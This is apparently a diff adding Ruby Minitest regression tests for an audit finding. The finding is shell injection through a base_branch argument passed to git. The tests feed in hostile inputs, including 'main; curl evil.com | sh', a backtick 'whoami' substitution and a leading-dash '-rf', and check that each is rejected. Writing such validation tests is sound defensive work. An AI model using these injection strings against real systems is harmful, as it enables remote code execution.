@@ -1188,3 +1188,57 @@ class TestLoadManifestShape < Minitest::Test
     assert_operator HarnessRegistry::ManifestShapeError, :<, StandardError
   end
 end
+
+# Audit finding L3-03 — base_branch arg flows unescaped into git backticks;
+# a tainted CI input must be rejected before it reaches the shell.
+class TestChangedFilesBaseBranchValidation < Minitest::Test
+  def test_rejects_shell_injection_attempt
+    Dir.mktmpdir do |tmp|
+      err = assert_raises(ArgumentError) do
+        HarnessRegistry.changed_files(tmp, "main; curl evil.com | sh")
+      end
+      assert_match(/Invalid base_branch/, err.message)
+      assert_match(/shell-injection-safe/, err.message)
+    end
+  end
+
+  def test_rejects_leading_dash
+    Dir.mktmpdir do |tmp|
+      assert_raises(ArgumentError) do
+        HarnessRegistry.changed_files(tmp, "-rf")
+      end
+    end
+  end
+
+  def test_rejects_backtick
+    Dir.mktmpdir do |tmp|
+      assert_raises(ArgumentError) do
+        HarnessRegistry.changed_files(tmp, "main`whoami`")
+      end
+    end
+  end
+
+  def test_rejects_non_string
+    Dir.mktmpdir do |tmp|
+      assert_raises(ArgumentError) do
+        HarnessRegistry.changed_files(tmp, nil)
+      end
+    end
+  end
+
+  def test_accepts_main
+    # Plain "main" must not raise (the validation passes; the downstream git
+    # call may legitimately return empty when there are no changes — that's
+    # not this method's concern).
+    Dir.mktmpdir do |tmp|
+      HarnessRegistry.changed_files(tmp, "main")
+    end
+  end
+
+  def test_accepts_origin_qualified
+    # "release/v1.2.3" exercises every allowed char class.
+    Dir.mktmpdir do |tmp|
+      HarnessRegistry.changed_files(tmp, "release/v1.2.3")
+    end
+  end
+end
